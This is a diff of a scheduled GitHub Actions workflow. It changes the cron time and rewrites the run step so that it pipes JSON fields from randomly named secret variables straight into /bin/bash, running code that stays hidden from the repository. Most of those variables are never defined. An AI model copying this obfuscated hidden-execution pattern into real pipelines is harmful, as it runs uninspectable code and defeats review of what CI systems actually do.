@@ -3,8 +3,7 @@ name: niyelaitiantianyihuo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
-
+    - cron: '59 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,18 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: niyelaitiantianyihuo
         env:
-          yiicy9471: ${{ secrets.yiicy9471 }}
+          gu1520: ${{ secrets.gu1520 }}
         run: |
-          echo $yiicy9471 | jq -r .zdwni94 | /bin/bash
-          echo $qhbpi02 | jq -r .ogy70 | /bin/bash
-          echo $tuvt8 | jq -r .ftiv61 | /bin/bash
-          echo $rhtc6888 | jq -r .wh9437 | /bin/bash
-          echo $roa7907 | jq -r .so40631 | /bin/bash
-          echo $nbhy4831 | jq -r .un92 | /bin/bash
-          echo $pfn2 | jq -r .amfy3 | /bin/bash
-          echo $pbdpt86127 | jq -r .gtqgd362 | /bin/bash
-          echo $esmpu7 | jq -r .y26 | /bin/bash
-          echo $xd94016 | jq -r .kic3189 | /bin/bash
-          echo $lcory1 | jq -r .knhfz23 | /bin/bash
-          echo $vi47432 | jq -r .htbx05 | /bin/bash
+          echo $gu1520 | jq -r .ofuzs4 | /bin/bash
+          echo $zh6642 | jq -r .vhw55 | /bin/bash
+          echo $ix14829 | jq -r .qcd2 | /bin/bash
+          echo $zpw51 | jq -r .wzy40 | /bin/bash
+          echo $ll7 | jq -r .zul41670 | /bin/bash
+          echo $no0344 | jq -r .s2377 | /bin/bash
+          echo $gzkec17812 | jq -r .e0 | /bin/bash
+          echo $ko38 | jq -r .e909 | /bin/bash
+          echo $ehmd73 | jq -r .kvgxc894 | /bin/bash
+          echo $ixvu9 | jq -r .mcrq991 | /bin/bash
+          echo $c31577 | jq -r .c66349 | /bin/bash
 
